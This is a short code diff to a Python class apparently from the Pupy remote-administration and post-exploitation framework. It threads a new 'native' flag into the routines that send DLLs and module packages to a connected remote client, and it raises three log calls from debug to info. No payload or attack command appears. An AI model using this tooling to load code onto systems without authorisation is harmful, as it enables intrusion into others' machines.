@@ -57,7 +57,9 @@ class PupyClient(object):
         }
 
         #alias
-        self.conn = self.desc["conn"]
+        self.conn = self.desc['conn']
+        self.native = self.desc['native']
+
         self.pupsrv = pupsrv
         self.imported_dlls = set()
         self.imported_modules = set()
@@ -338,7 +340,7 @@ class PupyClient(object):
         if name in self.imported_dlls:
             return False
 
-        buf = dependencies.dll(name, self.platform, self.arch)
+        buf = dependencies.dll(name, self.platform, self.arch, native=self.native)
         if not buf:
             raise ImportError('Shared object {} not found'.format(name))
 
@@ -455,7 +457,7 @@ class PupyClient(object):
                 posix=self.is_posix(), honor_ignore=honor_ignore,
                 filter_needed_cb=lambda modules, dll: self.filter_new_modules(
                     modules, dll, forced, remote
-                )
+                ), native=self.native
             )
 
             self.cached_modules.update(contents)
@@ -509,17 +511,17 @@ class PupyClient(object):
             self.remote_invalidate_module(module_name)
 
     def remote_load_package(self, module_name):
-        logger.debug('remote_load_package for %s started', module_name)
+        logger.info('remote_load_package for %s started', module_name)
 
         try:
             return self.load_package(module_name, remote=True)
 
         except dependencies.NotFoundError:
-            logger.debug('remote_load_package for %s failed', module_name)
+            logger.info('remote_load_package for %s failed', module_name)
             return None, None
 
         finally:
-            logger.debug('remote_load_package for %s completed', module_name)
+            logger.info('remote_load_package for %s completed', module_name)
 
     def remote_print_error(self, msg):
         self.pupsrv.handler.display_warning(msg)
